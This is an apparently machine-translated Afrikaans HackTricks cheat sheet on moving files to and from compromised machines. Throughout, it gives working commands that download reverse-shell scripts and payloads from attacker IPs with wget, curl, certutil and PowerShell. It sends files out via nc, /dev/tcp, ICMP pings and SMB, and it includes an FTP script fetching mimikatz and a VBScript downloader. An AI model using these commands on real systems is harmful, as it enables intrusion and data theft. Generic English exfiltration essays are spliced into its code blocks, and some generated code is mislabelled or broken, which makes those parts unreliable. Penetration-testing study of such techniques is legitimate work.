# Uitleiding

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repositoriums.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Vind kwesbaarhede wat die belangrikste is sodat jy hulle vinniger kan regstel. Intruder volg jou aanvalsoppervlak, voer proaktiewe dreigingsskanderings uit, vind probleme regoor jou hele tegnologie-stapel, van API's tot webtoepassings en wolkstelsels. [**Probeer dit vandag nog gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Gewoonlik toegelate domeine om inligting uit te voer

Kyk na [https://lots-project.com/](https://lots-project.com/) om gewoonlik toegelate domeine te vind wat misbruik kan word

## Kopieer & Plak Base64

**Linux**
```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
**Windows**

# Exfiltration

## Introduction

Exfiltration is the process of unauthorized data transfer from a target system to an external location. In the context of hacking, exfiltration is often used to steal sensitive information or to maintain persistence within a compromised network.

## Techniques

### 1. File Transfer Protocol (FTP)

FTP is a standard network protocol used for transferring files between a client and a server. Attackers can use FTP to exfiltrate data by connecting to an FTP server and uploading the stolen files.

### 2. Hypertext Transfer Protocol (HTTP)

HTTP is the protocol used for transmitting data over the internet. Attackers can use HTTP to exfiltrate data by sending HTTP requests to a remote server, either by embedding the data in the request or by uploading files.

### 3. Domain Name System (DNS)

DNS is responsible for translating domain names into IP addresses. Attackers can use DNS exfiltration to encode and send data within DNS queries or responses, bypassing traditional network security measures.

### 4. Email

Attackers can exfiltrate data by sending it as email attachments or by using steganography techniques to hide the data within the email content.

### 5. Cloud Storage

Attackers can use cloud storage services, such as Dropbox or Google Drive, to exfiltrate data by uploading the stolen files to the cloud and accessing them from a different location.

### 6. Remote Desktop Protocol (RDP)

RDP allows users to connect to and control a remote computer over a network connection. Attackers can use RDP to exfiltrate data by transferring files from the compromised system to the attacker's machine.

### 7. USB Devices

Attackers can physically connect USB devices to a target system to exfiltrate data. This can be done by copying files directly to the USB device or by using specialized tools that automatically exfiltrate data when the device is connected.

## Countermeasures

To prevent exfiltration attacks, organizations should implement the following countermeasures:

- Implement network segmentation to restrict unauthorized access to sensitive data.
- Use encryption to protect data in transit.
- Monitor network traffic for suspicious activity.
- Implement data loss prevention (DLP) solutions to detect and prevent unauthorized data transfers.
- Regularly update and patch software to address known vulnerabilities.
- Educate employees about the risks of exfiltration and the importance of following security best practices.

By implementing these countermeasures, organizations can significantly reduce the risk of data exfiltration and protect their sensitive information.
```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```
### HTTP

**Linux**
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
**Windows**

# Exfiltration

## Introduction

Exfiltration is the process of unauthorized data transfer from a target system to an external location. In the context of hacking, exfiltration is often used to steal sensitive information or to maintain persistence within a compromised network.

## Techniques

### 1. File Transfer Protocol (FTP)

FTP is a standard network protocol used for transferring files between a client and a server. Attackers can use FTP to exfiltrate data by connecting to an FTP server and uploading the stolen files.

### 2. Hypertext Transfer Protocol (HTTP)

HTTP is the protocol used for transmitting data over the internet. Attackers can use HTTP to exfiltrate data by sending HTTP requests to a remote server, either by embedding the data in the request or by uploading files.

### 3. Domain Name System (DNS)

DNS is responsible for translating domain names into IP addresses. Attackers can use DNS exfiltration to encode and send data within DNS queries or responses, bypassing traditional network security measures.

### 4. Email

Attackers can exfiltrate data by sending it as email attachments or by using steganography techniques to hide the data within the email content.

### 5. Cloud Storage

Attackers can use cloud storage services, such as Dropbox or Google Drive, to exfiltrate data by uploading the stolen files to the cloud and accessing them from a different location.

### 6. Remote Desktop Protocol (RDP)

RDP allows users to connect to and control a remote computer over a network connection. Attackers can use RDP to exfiltrate data by transferring files from the compromised system to the attacker's machine.

### 7. USB Devices

Attackers can physically connect USB devices to a target system to exfiltrate data. This can be done by copying files directly to the USB device or by using specialized tools to extract data from the system.

## Countermeasures

To prevent exfiltration attacks, organizations can implement the following countermeasures:

- Implement network segmentation to restrict access between different parts of the network.
- Use data loss prevention (DLP) solutions to monitor and control the flow of sensitive data.
- Employ intrusion detection and prevention systems (IDS/IPS) to detect and block exfiltration attempts.
- Regularly update and patch software to fix vulnerabilities that could be exploited for exfiltration.
- Train employees on security best practices and the risks associated with exfiltration.

By implementing these countermeasures, organizations can significantly reduce the risk of data exfiltration and protect their sensitive information.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
### Laai lêers op

* [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
* [**SimpleHttpServer druk GET en POSTs (ook koppe)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
* Python-module [uploadserver](https://pypi.org/project/uploadserver/):
```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```
### **HTTPS-bediener**

'n HTTPS-bediener is 'n bediener wat gebruik maak van die HTTPS-protokol vir veilige kommunikasie. Dit maak gebruik van SSL/TLS-sertifikate om die kommunikasie tussen die bediener en die kliënt te versleutel en te verseker dat die data veilig oorgedra word. 'n HTTPS-bediener word dikwels gebruik vir die hantering van sensitiewe inligting, soos persoonlike besonderhede, finansiële transaksies en ander vertroulike data. Dit is belangrik om 'n veilige en betroubare HTTPS-bediener te hê om die risiko van datalekke en aanvalle te verminder.
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
print(request.get_json())
return "OK"
if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```
## FTP

### FTP-bediener (python)

```python
import socket
import os

def send_file(file_path, host, port):
    # Verbind met die bediener
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    # Stuur die lêerinhoud na die bediener
    with open(file_path, 'rb') as file:
        data = file.read(1024)
        while data:
            s.send(data)
            data = file.read(1024)

    # Sluit die verbinding
    s.close()

def receive_file(file_path, host, port):
    # Luister vir inkomende verbindings
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(1)

    # Aanvaar die verbindin
    conn, addr = s.accept()

    # Ontvang die lêerinhoud van die kliënt
    with open(file_path, 'wb') as file:
        data = conn.recv(1024)
        while data:
            file.write(data)
            data = conn.recv(1024)

    # Sluit die verbinding
    conn.close()
    s.close()
```

Hierdie kode demonstreer hoe om 'n eenvoudige FTP-bediener in Python te skep. Die `send_file`-funksie stuur 'n lêer na die bediener, terwyl die `receive_file`-funksie 'n lêer van die bediener ontvang.

Om 'n lêer na die bediener te stuur, moet jy die `send_file`-funksie oproep en die volledige pad na die lêer, die bediener se IP-adres en die poortnommer as argumente verskaf. Byvoorbeeld:

```python
send_file('/pad/na/lêer.txt', '192.168.0.100', 21)
```

Om 'n lêer van die bediener te ontvang, moet jy die `receive_file`-funksie oproep en die volledige pad na die lêer, die IP-adres van die bediener en die poortnommer as argumente verskaf. Byvoorbeeld:

```python
receive_file('/pad/na/lêer.txt', '192.168.0.100', 21)
```

Merk op dat jy die poortnommer moet spesifiseer wat deur die FTP-bediener gebruik word. Die standaardpoort vir FTP is 21.
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```
### FTP-bediener (NodeJS)

Hierdie gedeelte beskryf 'n metode om data uit te voer deur gebruik te maak van 'n FTP-bediener wat in NodeJS geïmplementeer is.

#### Stap 1: Installeer die nodige afhanklikhede

Om die FTP-bediener in NodeJS te gebruik, moet jy die nodige afhanklikhede installeer. Voer die volgende opdrag in die opdraglyn uit:

```bash
npm install ftp
```

#### Stap 2: Skryf die kode

Maak 'n nuwe JavaScript-lêer en voeg die volgende kode daarby:

```javascript
const ftp = require('ftp');

// Verbind met die FTP-bediener
const client = new ftp();
client.connect({
    host: 'ftp.example.com',
    user: 'username',
    password: 'password'
});

// Wanneer die verbinding suksesvol is
client.on('ready', () => {
    // Laai die lêer op na die bediener
    client.put('local_file.txt', 'remote_file.txt', (err) => {
        if (err) throw err;
        console.log('Lêer suksesvol opgelaai na die bediener');
        client.end(); // Sluit die verbinding
    });
});
```

#### Stap 3: Voer die kode uit

Voer die volgende opdrag in die opdraglyn uit om die kode uit te voer:

```bash
node filename.js
```

Vervang `filename.js` met die naam van jou JavaScript-lêer.

Die kode sal die lêer `local_file.txt` na die FTP-bediener oplaai as `remote_file.txt`. As die operasie suksesvol is, sal die boodskap "Lêer suksesvol opgelaai na die bediener" gedruk word.

Dit is 'n eenvoudige manier om data uit te voer deur gebruik te maak van 'n FTP-bediener in NodeJS. Onthou om die nodige veiligheidsmaatreëls te tref om ongemagtigde toegang tot die bediener te voorkom.
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
### FTP-bediener (pure-ftp)

#### Inleiding

FTP (File Transfer Protocol) is 'n protokol wat gebruik word vir die oordrag van lêers tussen rekenaars op 'n netwerk. Dit maak gebruik van 'n bediener-kliënt-arkitektuur, waar die bediener die lêers hou en die kliënt die lêers kan aflaai of oplaai.

#### Pure-FTP

Pure-FTP is 'n vinnige en veilige FTP-bedieningsagteware wat gebruik kan word om 'n FTP-bediener op te stel. Dit is 'n gewilde keuse vir die opstel van 'n privaat of openbare FTP-bediener.

#### Uitfiltering van data

Die uitfiltering van data van 'n FTP-bediener kan 'n nuttige tegniek wees vir die verkryging van gevoelige inligting. Hier is 'n paar metodes wat gebruik kan word om data uit te filter:

1. **Lêeroplaaiing**: Deur 'n kwaadwillige lêer op die FTP-bediener op te laai, kan 'n aanvaller toegang verkry tot die bediener en die inhoud daarvan ondersoek.
2. **Lêeraflaaiing**: Deur 'n lêer van die FTP-bediener af te laai, kan 'n aanvaller gevoelige inligting verkry wat op die bediener gestoor word.
3. **Lêeruitvoering**: As die FTP-bediener die uitvoering van lêers toelaat, kan 'n aanvaller 'n kwaadwillige lêer op die bediener plaas en dit uitvoer om toegang tot die bediener te verkry.

#### Voorkoming van data-uitfiltering

Om die risiko van data-uitfiltering van 'n FTP-bediener te verminder, kan die volgende maatreëls geneem word:

1. **Sterk wagwoorde**: Stel sterk wagwoorde in vir die FTP-bediener en vermy die gebruik van maklik raadbare wagwoorde.
2. **Toegangsbeheer**: Beperk die toegang tot die FTP-bediener deur slegs geakkrediteerde gebruikers toe te laat.
3. **Versleuteling**: Gebruik versleuteling om die oordrag van data tussen die kliënt en die bediener te beskerm.
4. **Besoekbeperkings**: Beperk die toegang tot die FTP-bediener deur slegs spesifieke IP-adresse toe te laat.
5. **Opdaterings en patches**: Verseker dat die FTP-bedieningsagteware opgedateer word met die nuutste opdaterings en patches om bekende kwesbaarhede te vermy.

#### Gevolgtrekking

Die uitfiltering van data van 'n FTP-bediener kan 'n effektiewe tegniek wees vir die verkryging van gevoelige inligting. Dit is belangrik om die nodige maatreëls te tref om die risiko van data-uitfiltering te verminder en die veiligheid van die FTP-bediener te verseker.
```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
### **Windows** kliënt
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Vind kwesbaarhede wat die belangrikste is sodat jy hulle vinniger kan regmaak. Intruder volg jou aanvalsoppervlak, voer proaktiewe bedreigingsskanderings uit, vind probleme regoor jou hele tegnologie-stapel, van API's tot webtoepassings en wolkstelsels. [**Probeer dit vandag gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## SMB

Kali as bediener
```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```
Of skep 'n smb-deel **deur samba te gebruik**:
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
comment = Samba on Ubuntu
path = /tmp/smb
read only = no
browsable = yes
guest ok = Yes
#Start samba
service smbd restart
```
# Exfiltrasie

## Inleiding

Exfiltrasie is die proses waardeur 'n aanvaller gesteelde data uit 'n teikenstelsel verwyder en oordra na 'n eksterne bediener of stoorplek. Hierdie tegniek word dikwels gebruik deur aanvallers om gevoelige inligting te ontvreem, soos kredietkaartbesonderhede, wagwoorde, persoonlike inligting en vertroulike dokumente.

## Metodes van Exfiltrasie

### 1. Bestandsoordrag

Hierdie metode behels die oordra van gesteelde data deur dit in 'n bestand te verpak en dit dan oor te dra na 'n eksterne bediener. Dit kan gedoen word deur gebruik te maak van protokolle soos HTTP, FTP, SMB of SMTP.

### 2. Versteekte data in beeldlêers

Aanvallers kan data versteek in beeldlêers deur dit te versluier en dan as 'n normale beeldlêer te laat voorkom. Hierdie metode maak gebruik van steganografie, wat die kunst is om data te versteek binne 'n ander tipe lêer sonder om die oorspronklike lêer te beskadig.

### 3. Gebruik van DNS

Aanvallers kan DNS-kanale gebruik om gesteelde data te exfiltreer. Hierdie metode behels die gebruik van DNS-navrae om data te verpak en oor te dra na 'n eksterne bediener. Dit kan gedoen word deur die DNS-navrae te manipuleer en die gesteelde data as deel van die DNS-navrae te versluier.

### 4. Gebruik van uitvoerbare lêers

Aanvallers kan gesteelde data in 'n uitvoerbare lêer insluit en dit dan oor te dra na 'n eksterne bediener. Hierdie metode maak gebruik van die uitvoerbare lêer se funksionaliteit om die gesteelde data te verpak en oor te dra.

### 5. Gebruik van e-pos

Aanvallers kan gesteelde data as 'n e-posaanhangsel stuur na 'n eksterne e-posrekening. Hierdie metode maak gebruik van die e-posprotokol om die gesteelde data te verpak en oor te dra.

## Voorkoming van Exfiltrasie

Om exfiltrasie te voorkom, kan die volgende maatreëls geneem word:

- Monitor die netwerkverkeer vir verdagte aktiwiteit en ongewone data-oordragte.
- Beperk die toegang tot gevoelige data en stel streng toegangsbeheerbeleide in.
- Implementeer 'n firewall en gebruik netwerksegmentering om die verspreiding van gesteelde data te beperk.
- Verseker dat alle sagteware en bedryfstelsels opgedateer word met die nuutste beveiligingspatches.
- Stel 'n sterk wagwoordbeleid in en moedig gebruikers aan om unieke en veilige wagwoorde te gebruik.
- Bewusmaking van gebruikers oor die risiko's van phishing-aanvalle en die deel van persoonlike inligting.

## Slotwoord

Exfiltrasie is 'n kritieke bedreiging vir die veiligheid van data en moet ernstig opgeneem word. Deur bewus te wees van die verskillende metodes van exfiltrasie en deur die nodige voorkomingsmaatreëls te tref, kan organisasies hulself beskerm teen hierdie aanvalstegniek.
```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
## SCP

Die aanvaller moet SSHd laat loop.
```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```
## SSHFS

As die slagoffer SSH het, kan die aanvaller 'n gids van die slagoffer na die aanvaller se rekenaar koppel.
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
## NC

NC (Netcat) is a versatile networking utility that can be used for various purposes, including exfiltration of data. It allows for easy creation of TCP or UDP connections between two machines, making it a useful tool for transferring data from a compromised system to an external server.

To exfiltrate data using NC, you can follow these steps:

1. Set up a listener on the external server using the following command:
   ```
   nc -l -p <port> > <output_file>
   ```
   Replace `<port>` with the desired port number and `<output_file>` with the name of the file where the data will be saved.

2. On the compromised system, use the following command to send the data to the external server:
   ```
   nc <server_ip> <port> < <input_file>
   ```
   Replace `<server_ip>` with the IP address of the external server, `<port>` with the same port number used in the listener, and `<input_file>` with the name of the file containing the data to be exfiltrated.

3. Once the command is executed, the data will be transferred from the compromised system to the external server and saved in the specified output file.

NC can also be used in combination with other tools and techniques to enhance exfiltration capabilities. For example, you can compress the data before sending it using NC, or encrypt it to ensure confidentiality during transit.

It is important to note that exfiltration of data without proper authorization is illegal and unethical. This information is provided for educational purposes only, and should not be used for any malicious activities.
```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
### Laai lêer af van slagoffer

Om 'n lêer van die slagoffer se stelsel af te laai, kan jy die `/dev/tcp`-benadering gebruik. Hier is die sintaksis:

```bash
cat < /dev/tcp/<IP>/<port> > <destination_file>
```

Vervang `<IP>` met die IP-adres van die slagoffer se stelsel en `<port>` met die poortnommer waarop die lêer beskikbaar is. Vervang ook `<destination_file>` met die pad en naam van die lêer waarin jy die aflaai wil stoor.

Hier is 'n voorbeeld van hoe jy dit kan gebruik:

```bash
cat < /dev/tcp/192.168.0.100/8080 > /tmp/secret_file.txt
```

Hierdie opdrag sal die lêer `secret_file.txt` aflaai vanaf die stelsel met die IP-adres `192.168.0.100` op poort `8080` en dit stoor in die `/tmp`-gids.
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```
### Laai lêer op na slagoffer

Om 'n lêer na 'n slagoffer te laai, kan jy die volgende metodes gebruik:

#### 1. HTTP-aanvraag

Jy kan 'n HTTP-aanvraag stuur om die lêer na die slagoffer se bediener te stuur. Dit kan gedoen word deur die `POST`-metode te gebruik en die lêer as 'n vormdata te stuur. Die slagoffer se bediener moet die lêer aanvaar en stoor op 'n plek waar jy toegang daartoe het.

#### 2. E-pos

Jy kan die lêer as 'n aanhangsel in 'n e-pos stuur na 'n e-posadres wat deur die slagoffer gebruik word. Die slagoffer moet die e-pos ontvang en die aanhangsel aflaai. Dit vereis dat jy toegang het tot die slagoffer se e-posrekening of 'n manier het om die e-pos te onderskep.

#### 3. Bestandsoordragprotokolle

As jy toegang het tot die slagoffer se rekenaar of netwerk, kan jy gebruik maak van bestandsoordragprotokolle soos FTP, SFTP, SCP of SMB om die lêer na 'n plek te stuur waar jy toegang daartoe het. Hierdie metode vereis dat jy toegang het tot die slagoffer se rekenaar of netwerk en dat die nodige protokolle geïnstalleer en gekonfigureer is.

#### 4. Cloud-gebaseerde dienste

As die slagoffer gebruik maak van 'n wolkgebaseerde diens soos Google Drive, Dropbox of OneDrive, kan jy die lêer na die slagoffer se rekening oplaai. Dit vereis dat jy toegang het tot die slagoffer se rekening of 'n manier het om die toegangslegitimasie te bekom.

Onthou, die laai van 'n lêer na 'n slagoffer se stelsel sonder hul toestemming is onwettig en word as 'n aanval beskou. Wees verantwoordelik en gebruik hierdie tegnieke slegs binne die raamwerk van wettige toetse of met toestemming van die eienaar van die stelsel.
```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```
Dankie aan **@BinaryShadow\_**

## **ICMP**
```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
if pkt.haslayer(ICMP):
if pkt[ICMP].type == 0:
data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```
## **SMTP**

As jy data na 'n SMTP-bediener kan stuur, kan jy 'n SMTP skep om die data met Python te ontvang:
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```
## TFTP

Standaard in XP en 2003 (in ander moet dit eksplisiet bygevoeg word tydens installasie)

In Kali, **begin TFTP-bediener**:
```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```
**TFTP-bediener in Python:**

Hier is 'n eenvoudige implementering van 'n TFTP-bediener in Python. Hierdie kode kan gebruik word om 'n TFTP-bediener te skep wat bestandsoordragte kan hanteer.

```python
import socket
import struct

def tftp_server():
    # Skep 'n UDP-socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_socket.bind(('0.0.0.0', 69))

    print("TFTP-bediener is gereed om versoek te ontvang...")

    while True:
        # Ontvang die versoek en die klient se adres
        data, client_address = server_socket.recvfrom(516)

        # Haal die opcode uit die ontvangsdata
        opcode = struct.unpack('!H', data[:2])[0]

        # Kontroleer of dit 'n leesversoek is
        if opcode == 1:
            # Stuur die gewenste lêer terug na die klient
            file_data = b'\x00\x03\x00\x01'
            server_socket.sendto(file_data, client_address)

        # Kontroleer of dit 'n skryfversoek is
        elif opcode == 2:
            # Ontvang die lêer van die klient
            file_data, client_address = server_socket.recvfrom(516)

            # Stoor die ontvangsdata in 'n lêer
            with open('ontvangs.lêer', 'wb') as file:
                file.write(file_data[4:])

            # Bevestig die suksesvolle ontvangs aan die klient
            ack_packet = b'\x00\x04\x00\x00'
            server_socket.sendto(ack_packet, client_address)

        # Kontroleer of dit 'n onbekende versoek is
        else:
            # Stuur 'n foute-pakket terug na die klient
            error_packet = b'\x00\x05\x00\x04Unknown request\x00'
            server_socket.sendto(error_packet, client_address)

    # Sluit die bediener se socket
    server_socket.close()

# Begin die TFTP-bediener
tftp_server()
```

Hierdie kode skep 'n UDP-socket en bind dit aan poort 69. Dit wag dan vir TFTP-versoeke van kliente. As 'n leesversoek ontvang word, stuur die bediener die gewenste lêer terug na die klient. As 'n skryfversoek ontvang word, ontvang die bediener die lêer van die klient en stoor dit in 'n lêer genaamd "ontvangs.lêer". As 'n onbekende versoek ontvang word, stuur die bediener 'n foute-pakket terug na die klient.

Hierdie kode kan as 'n basis dien vir 'n eie TFTP-bediener-implementering in Python.
```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```
In **slagoffer**, verbind met die Kali-bediener:
```bash
tftp -i <KALI-IP> get nc.exe
```
## PHP

Laai 'n lêer af met 'n PHP eenregtelik:
```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
## VBScript

VBScript (Visual Basic Scripting Edition) is a scripting language developed by Microsoft. It is often used for automating tasks and creating dynamic web pages. VBScript is commonly used in Windows environments and can be executed using the Windows Script Host (WSH).

### Basic Syntax

VBScript code is written in plain text and saved with a .vbs file extension. Here is an example of a basic VBScript program:

```vbs
MsgBox "Hello, World!"
```

This code will display a message box with the text "Hello, World!" when executed.

### Variables

In VBScript, variables are used to store data. They can be declared using the `Dim` keyword. Here is an example:

```vbs
Dim name
name = "John"
```

In this example, a variable named `name` is declared and assigned the value "John".

### Control Structures

VBScript supports various control structures, such as `If...Then...Else`, `For...Next`, and `Do...Loop`. These structures allow you to control the flow of your program based on certain conditions. Here is an example of an `If...Then...Else` statement:

```vbs
Dim age
age = 18

If age >= 18 Then
    MsgBox "You are an adult."
Else
    MsgBox "You are a minor."
End If
```

This code will display a message box based on the value of the `age` variable.

### Functions

VBScript provides built-in functions that can be used to perform various operations. For example, the `MsgBox` function is used to display a message box. Here is an example:

```vbs
MsgBox "Hello, World!"
```

This code will display a message box with the text "Hello, World!".

### File Operations

VBScript can also be used to perform file operations, such as reading from and writing to files. The `FileSystemObject` is used to interact with files and folders. Here is an example of reading from a file:

```vbs
Dim fso, file, text

Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.OpenTextFile("C:\path\to\file.txt", 1)
text = file.ReadAll
file.Close

MsgBox text
```

This code will read the contents of the file "C:\path\to\file.txt" and display it in a message box.

### Conclusion

VBScript is a powerful scripting language that can be used for various tasks, including automation and web development. It provides a wide range of features and built-in functions that make it a versatile choice for Windows environments.
```bash
Attacker> python -m SimpleHTTPServer 80
```
**Slagoffer**
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```
## Debug.exe

Die `debug.exe` program maak dit nie net moontlik om binêre lêers te ondersoek nie, maar het ook die **vermoë om hulle te herbou vanaf heks**. Dit beteken dat deur 'n heks van 'n binêre lêer te voorsien, `debug.exe` die binêre lêer kan genereer. Dit is egter belangrik om daarop te let dat debug.exe 'n **beperking het om lêers tot 64 kb in grootte saam te stel**.
```bash
# Reduce the size
upx -9 nc.exe
wine exe2bat.exe nc.exe nc.txt
```
Kopieer en plak dan die teks in die Windows-skulp en 'n lêer genaamd nc.exe sal geskep word.

* [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)

## DNS

* [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

